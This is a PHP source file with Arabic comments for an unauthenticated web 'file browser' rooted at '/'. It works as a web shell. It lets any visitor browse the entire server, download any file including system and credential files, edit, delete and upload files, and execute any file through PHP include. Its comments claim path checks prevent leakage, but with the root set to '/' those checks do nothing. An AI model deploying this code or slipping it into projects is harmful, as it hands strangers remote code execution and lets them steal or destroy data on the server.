<?php
// تحديد الدليل الأساسي الذي يسمح بالوصول إليه على نظام Linux
$base_dir = '/';

// تحديد المجلد الحالي من GET أو استخدام المجلد الافتراضي (الدليل الأساسي)
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $base_dir;

// التأكد من أن المجلد الحالي موجود وضمن الدليل الأساسي
if (!$current_dir || strpos($current_dir, $base_dir) !== 0) {
    $current_dir = $base_dir;
}

// مسار الرجوع إلى المجلد السابق، يتم عرضه فقط إذا لم نصل للدليل الأساسي
$parent_dir = dirname($current_dir);
$back_link = ($current_dir !== $base_dir) ? "<a href='?dir=" . urlencode($parent_dir) . "'>⬅️ رجوع</a>" : "";

// تحميل الملفات عند الطلب
if (isset($_GET['download'])) {
    $file = realpath($_GET['download']);
    // التحقق من أن الملف موجود وأنه يقع ضمن الدليل الأساسي لتفادي التسريب
    if ($file && strpos($file, $base_dir) === 0 && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "ملف غير صالح.";
        exit;
    }
}

// حذف الملف عند الطلب
if (isset($_GET['delete'])) {
    $file = realpath($_GET['delete']);
    // التحقق من أن الملف موجود وأنه يقع ضمن الدليل الأساسي
    if (!$file || strpos($file, $base_dir) !== 0 || !is_file($file)) {
        echo "ملف غير صالح.";
        exit;
    }
    
    // عند إرسال النموذج (تأكيد أو إلغاء)
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['confirm'])) {
            if (unlink($file)) {
                header("Location: ?dir=" . urlencode(dirname($file)));
                exit;
            } else {
                $error = "حدث خطأ أثناء حذف الملف.";
            }
        }
        if (isset($_POST['cancel'])) {
            header("Location: ?dir=" . urlencode(dirname($file)));
            exit;
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>حذف الملف: <?php echo htmlspecialchars(basename($file)); ?></title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            button { padding: 8px 12px; margin-right: 10px; font-size: 14px; cursor: pointer; }
            .error { color: red; }
        </style>
    </head>
    <body>
        <h2>حذف الملف: <?php echo htmlspecialchars($file); ?></h2>
        <?php if (isset($error)) { echo "<p class='error'>$error</p>"; } ?>
        <p>هل أنت متأكد من حذف هذا الملف؟</p>
        <form method="POST" action="?delete=<?php echo urlencode($file); ?>">
            <button type="submit" name="confirm">نعم، حذف الملف</button>
            <button type="submit" name="cancel">إلغاء</button>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// ميزة العرض (Show) - تنفيذ الملف على السيرفر وعرض الناتج
if (isset($_GET['show'])) {
    $file = realpath($_GET['show']);
    // التحقق من أن الملف موجود وأنه يقع ضمن الدليل الأساسي
    if (!$file || strpos($file, $base_dir) !== 0 || !is_file($file)) {
        echo "ملف غير صالح.";
        exit;
    }

    // تنفيذ الملف على السيرفر وإظهار الناتج
    ob_start();
    include $file;
    $output = ob_get_clean();

    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>عرض الملف: <?php echo htmlspecialchars(basename($file)); ?></title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            .back-link { margin-bottom: 20px; display: block; }
        </style>
    </head>
    <body>
        <a class="back-link" href="?dir=<?php echo urlencode(dirname($file)); ?>">⬅️ رجوع</a>
        <h2>عرض الملف: <?php echo htmlspecialchars(basename($file)); ?></h2>
        <hr>
        <!-- عرض مخرجات تنفيذ الملف -->
        <?php echo $output; ?>
    </body>
    </html>
    <?php
    exit;
}

// تحرير الملف عند الطلب
if (isset($_GET['edit'])) {
    $file = realpath($_GET['edit']);
    // التحقق من أن الملف موجود وأنه يقع ضمن الدليل الأساسي
    if (!$file || strpos($file, $base_dir) !== 0 || !is_file($file)) {
        echo "ملف غير صالح.";
        exit;
    }
    
    // عند إرسال النموذج (حفظ أو إلغاء)
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['save'])) {
            // حفظ التعديلات في الملف
            $new_content = $_POST['filecontent'];
            if (file_put_contents($file, $new_content) !== false) {
                header("Location: ?dir=" . urlencode(dirname($file)));
                exit;
            } else {
                $error = "حدث خطأ أثناء حفظ الملف.";
            }
        }
        if (isset($_POST['cancel'])) {
            header("Location: ?dir=" . urlencode(dirname($file)));
            exit;
        }
    }
    
    // جلب محتوى الملف لعرضه في منطقة التحرير
    $file_content = file_get_contents($file);
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>✏️ تحرير الملف: <?php echo htmlspecialchars(basename($file)); ?></title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            textarea { width: 100%; height: 400px; padding: 10px; font-family: Consolas, monospace; font-size: 14px; border: 1px solid #ccc; border-radius: 5px; }
            button { padding: 8px 12px; margin-right: 10px; font-size: 14px; cursor: pointer; }
            .error { color: red; }
        </style>
    </head>
    <body>
        <h2>✏️ تحرير الملف: <?php echo htmlspecialchars($file); ?></h2>
        <?php if (isset($error)) { echo "<p class='error'>$error</p>"; } ?>
        <form method="POST" action="?edit=<?php echo urlencode($file); ?>">
            <textarea name="filecontent"><?php echo htmlspecialchars($file_content); ?></textarea>
            <br><br>
            <button type="submit" name="save">💾 حفظ</button>
            <button type="submit" name="cancel">❌ إلغاء</button>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// ميزة رفع الملفات
$uploadError = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
    if ($_FILES['upload_file']['error'] !== UPLOAD_ERR_OK) {
        // التعامل مع أخطاء رفع الملفات
        switch ($_FILES['upload_file']['error']) {
            case UPLOAD_ERR_INI_SIZE:
            case UPLOAD_ERR_FORM_SIZE:
                $uploadError = "حجم الملف كبير جدًا.";
                break;
            case UPLOAD_ERR_PARTIAL:
                $uploadError = "تم تحميل الملف جزئيًا.";
                break;
            case UPLOAD_ERR_NO_FILE:
                $uploadError = "لم يتم تحميل أي ملف.";
                break;
            default:
                $uploadError = "حدث خطأ أثناء رفع الملف.";
        }
    } else {
        // بناء مسار الملف الهدف داخل المجلد الحالي
        $target_file = $current_dir . DIRECTORY_SEPARATOR . basename($_FILES['upload_file']['name']);
        // محاولة نقل الملف المرفوع إلى المجلد الهدف
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_file)) {
            header("Location: ?dir=" . urlencode($current_dir));
            exit;
        } else {
            $uploadError = "حدث خطأ أثناء نقل الملف المرفوع.";
        }
    }
}

// جلب الملفات والمجلدات من المجلد الحالي
$items = scandir($current_dir);
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>📂 متصفح الملفات</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        a { text-decoration: none; color: #007bff; font-weight: bold; }
        a:hover { text-decoration: underline; }
        ul { list-style-type: none; padding: 0; }
        li { margin: 8px 0; padding: 10px; background: #f8f9fa; border-radius: 5px; }
        li:hover { background: #e2e6ea; }
        input { width: 80%; padding: 8px; margin-bottom: 10px; }
        button { padding: 8px 12px; cursor: pointer; }
        .options { margin-top: 5px; }
        .options a { margin-right: 10px; font-size: 13px; }
        .upload-container { margin-top: 20px; padding: 15px; background: #e9ecef; border-radius: 5px; }
        .error { color: red; }
    </style>
</head>
<body>
    <h2>📂 متصفح الملفات</h2>
    
    <!-- نموذج لتغيير المسار يدويًا -->
    <form method="GET">
        <input type="text" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
        <button type="submit">🔍 فتح</button>
    </form>
    
    <p>📁 المسار الحالي: <strong><?php echo $current_dir; ?></strong></p>
    <p><?php echo $back_link; ?></p>
    
    <!-- نموذج رفع الملف -->
    <div class="upload-container">
        <h3>رفع ملف جديد</h3>
        <?php if ($uploadError): ?>
            <p class="error"><?php echo $uploadError; ?></p>
        <?php endif; ?>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="upload_file" required>
            <button type="submit">رفع الملف</button>
        </form>
    </div>
    
    <ul>
        <?php
        foreach ($items as $item) {
            if ($item === "." || $item === "..") continue;
            $full_path = realpath($current_dir . DIRECTORY_SEPARATOR . $item);
            if (!$full_path) continue;
            
            if (is_dir($full_path)) {
                echo "<li>📁 <a href='?dir=" . urlencode($full_path) . "'>" . htmlspecialchars($item) . "</a></li>";
            } else {
                // للملفات: عرض اسم الملف مع الخيارات (تحميل، تعديل، حذف، عرض)
                echo "<li>📄 " . htmlspecialchars($item);
                echo "<div class='options'>";
                echo "<a href='?download=" . urlencode($full_path) . "'>تحميل</a>";
                echo "<a href='?edit=" . urlencode($full_path) . "'>تعديل</a>";
                echo "<a href='?delete=" . urlencode($full_path) . "'>حذف</a>";
                echo "<a href='?show=" . urlencode($full_path) . "'>عرض</a>";
                echo "</div>";
                echo "</li>";
            }
        }
        ?>
    </ul>
</body>
</html>
